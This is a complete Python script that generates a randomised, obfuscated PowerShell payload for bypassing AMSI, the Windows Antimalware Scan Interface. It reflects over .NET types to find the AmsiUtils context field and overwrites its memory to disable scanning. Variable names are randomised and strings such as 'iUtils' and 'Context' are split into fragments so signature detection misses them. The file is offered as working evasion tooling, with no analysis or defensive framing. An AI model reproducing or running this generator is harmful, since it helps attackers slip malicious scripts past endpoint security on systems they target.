import random
import string

def get_random_var_name(length=6):
    letters = string.ascii_letters
    return "$" + ''.join(random.choice(letters) for _ in range(length))

def mangle_string(input_str):
    if not input_str:
        return "''"
    
    chunks = []
    i = 0
    while i < len(input_str):
        # Grab a random length between 1 and 4, but do not exceed input_str length
        chunk_len = min(random.randint(1, 4), len(input_str) - i)
        chunks.append(f"'{input_str[i:i+chunk_len]}'")
        i += chunk_len

    return '+'.join(chunks)

def generate_bypass():
    ref_assemblies = get_random_var_name()
    var_type = get_random_var_name()
    var_field = get_random_var_name()
    var_context_field = get_random_var_name()
    var_mem_addr = get_random_var_name()
    var_ptr = get_random_var_name()
    var_buf = get_random_var_name()

    str_iutils = mangle_string("iUtils")
    str_context = mangle_string("Context")
    str_nonpublic = mangle_string("NonPublic,Static")

    payload = (
        f"{ref_assemblies} = [Ref].Assembly.GetTypes(); "
        f"Foreach({var_type} in {ref_assemblies}) {{ "
        f"if ({var_type}.Name -like '*'+{str_iutils}) {{ {var_field} = {var_type} }} "
        f"}}; "
        f"{var_context_field} = $null; "
        f"Foreach($f in {var_field}.GetFields({str_nonpublic})) {{ "
        f"if ($f.Name -like '*'+{str_context}) {{ {var_context_field} = $f }} "
        f"}}; "
        f"{var_mem_addr} = {var_context_field}.GetValue($null); "
        f"[IntPtr]{var_ptr} = {var_mem_addr}; "
        f"[Int32[]]{var_buf} = @(0); "
        f"[System.Runtime.InteropServices.Marshal]::Copy({var_buf}, 0, {var_ptr}, 1)"
    )
    return payload

if __name__ == "__main__":
    print(generate_bypass())
